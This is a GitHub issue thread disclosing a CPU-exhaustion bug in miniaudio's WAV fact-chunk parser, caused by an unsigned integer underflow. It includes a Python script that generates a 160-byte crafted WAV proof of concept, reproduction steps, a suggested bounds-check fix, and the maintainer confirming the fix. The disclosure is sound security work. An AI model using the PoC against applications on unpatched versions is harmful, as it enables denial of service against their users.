@@ -1,0 +1,143 @@
+#1123 CPU exhaustion in WAV decoder via fact chunk chunkSize underflow (CWE-834) | closed | completed | 2026-07-13T03:47:38Z
+https://github.com/mackron/miniaudio/issues/1123
+Hi,
+I found a denial-of-service issue while testing the WAV parsing path in miniaudio and wanted to report it.
+
+Commit: 9634bed
+Component: `ma_dr_wav_init__internal()` — line 81449
+CWE: CWE-834 (Excessive Iteration), CWE-191 (Integer Underflow)
+
+A crafted 160-byte WAV file causes prolonged CPU exhaustion in `ma_decoder_init_memory()` and `ma_decoder_init_file()`.
+
+The issue is caused by an unsigned integer underflow in the fact chunk parser, which produces a near-2^64 forward seek and drives the seek loop into excessive iteration.
+
+## Root Cause
+
+In the RIFF fact chunk handler (line 81449), the parser unconditionally reads 4 bytes and subtracts 4 from `chunkSize` without checking that `chunkSize >= 4`:
+
+```c
+// Line 81446-81449
+if (ma_dr_wav__on_read(pWav->onRead, pWav->pUserData, &sampleCount, 4, &cursor) != 4) {
+    return MA_FALSE;
+}
+chunkSize -= 4;   // ← unsigned underflow when chunkSize < 4
+```
+
+When a fact chunk declares `sizeInBytes = 0`, this wraps `chunkSize` (`ma_uint64`) to `0xFFFFFFFFFFFFFFFC`. The subsequent seek at line 81463:
+
+```c
+chunkSize += header.paddingSize;
+if (ma_dr_wav__seek_forward(pWav->onSeek, chunkSize, pWav->pUserData) == MA_FALSE) {
+    break;
+}
+```
+
+passes this value to `ma_dr_wav__seek_forward` (line 80372), which loops in `0x7FFFFFFF`-byte increments:
+
+```c
+while (bytesRemainingToSeek > 0) {
+    if (bytesRemainingToSeek > 0x7FFFFFFF) {
+        if (!onSeek(pUserData, 0x7FFFFFFF, MA_DR_WAV_SEEK_CUR)) {
+            return MA_FALSE;
+        }
+        bytesRemainingToSeek -= 0x7FFFFFFF;
+    } else { ... }
+}
+```
+
+The loop terminates only when the seek callback returns failure. The decoder's memory seek callback (`ma_decoder__on_seek_memory`, line 66444) clamps to end-of-data and always returns `MA_SUCCESS`, so the loop never exits early. The file seek callback (`fseek`) also succeeds past EOF per C11 7.21.9.2.
+
+In contrast, `ma_dr_wav__on_seek_memory` (line 82570) returns `MA_FALSE` on out-of-bounds, so `ma_dr_wav_init_memory()` is immune.
+
+The same unchecked subtraction pattern exists at two more sites:
+
+| Line  | Context         | Subtraction                      |
+|-------|-----------------|----------------------------------|
+| 81449 | RIFF fact chunk | `chunkSize -= 4`                 |
+| 81459 | W64 fact chunk  | `chunkSize -= 8`                 |
+| 81581 | AIFF SSND chunk | `chunkSize -= sizeof(offsetAndBlockSizeData)` |
+
+## Affected APIs
+
+| API                        | Affected? | Notes                                  |
+|----------------------------|-----------|----------------------------------------|
+| `ma_decoder_init_memory()` | **Yes**   | ~15 s (seek callback always succeeds)  |
+| `ma_decoder_init_file()`   | **Yes**   | >30 s (fseek past EOF succeeds per C)  |
+| `ma_decoder_init()`        | **Yes**   | Same stream-based path                 |
+| `ma_dr_wav_init_memory()`  | No        | Its seek callback returns FALSE on OOB |
+
+## Impact
+
+Denial of service. 160 bytes of input ties up a CPU core for 15–30+ seconds on any application using the standard `ma_decoder_init_*` APIs.
+No memory corruption!
+
+## Reproduction
+
+```
+python3 gen_poc.py
+gcc -O1 reproduce.c -lm -lpthread -o reproduce
+./reproduce poc.wav
+```
+
+Expected output:
+```
+Input: poc.wav (160 bytes)
+
+1. ma_dr_wav_init_memory:   FAIL  (0.000 s)  <-- safe
+2. ma_decoder_init_memory:  running... (expect ~15 s hang)
+   result=-10  (14.6 s)  <-- CPU EXHAUSTION
+3. ma_decoder_init_file:    running... (30 s alarm set)
+   TIMED OUT — CPU exhaustion confirmed
+```
+
+gen_poc.py:
+```python
+import struct
+
+def make_poc_wav(fact_size=0):
+    fmt = struct.pack('<HHIIHH', 0x0002, 2, 44100, 44100, 256, 4)
+    fmt += struct.pack('<HH', 2, 0)
+    fmt_chunk = b'fmt ' + struct.pack('<I', len(fmt)) + fmt
+    fact_chunk = b'fact' + struct.pack('<I', fact_size) + b'\x00' * 4
+    data_chunk = b'data' + struct.pack('<I', 100) + b'\x00' * 100
+    body = fmt_chunk + fact_chunk + data_chunk
+    return b'RIFF' + struct.pack('<I', 4 + len(body)) + b'WAVE' + body
+
+with open('poc.wav', 'wb') as f:
+    f.write(make_poc_wav(fact_size=0))
+```
+
+## Suggested Fix
+
+Guard each `chunkSize -= N` with a bounds check:
+
+```c
+if (chunkSize < 4) {
+    break;
+}
+chunkSize -= 4;
+```
+
+Apply the same pattern at lines 81459 (`< 8`) and 81581 (`< sizeof(offsetAndBlockSizeData)`).
+
+
+COMMENT mackron 2026-05-09T20:33:13Z https://github.com/mackron/miniaudio/issues/1123#issuecomment-4413611417
+Do you have a sample file?
+
+COMMENT Gayang2902 2026-05-10T07:48:07Z https://github.com/mackron/miniaudio/issues/1123#issuecomment-4414766376
+The sample file was generated from gen_poc.py, so i did not attach it separately.
+I can upload the generated WAV file as well if needed. :)
+
+COMMENT mackron 2026-05-10T08:35:51Z https://github.com/mackron/miniaudio/issues/1123#issuecomment-4414851230
+Yes, please attach the WAV file.
+
+COMMENT Gayang2902 2026-05-10T08:38:04Z https://github.com/mackron/miniaudio/issues/1123#issuecomment-4414855647
+[poc.wav](https://github.com/user-attachments/files/27564777/poc.wav)
+WAV is here.
+
+COMMENT mackron 2026-07-13T00:52:51Z https://github.com/mackron/miniaudio/issues/1123#issuecomment-4953503669
+Thanks. This was coming from dr_wav. It has been fixed upstream and in miniaudio, both dev and dev-0.12 branches.
+
+COMMENT Gayang2902 2026-07-13T03:47:38Z https://github.com/mackron/miniaudio/issues/1123#issuecomment-4954244801
+Thanks for fixing this issue.
+Would you consider this issue eligible for a CVE? 
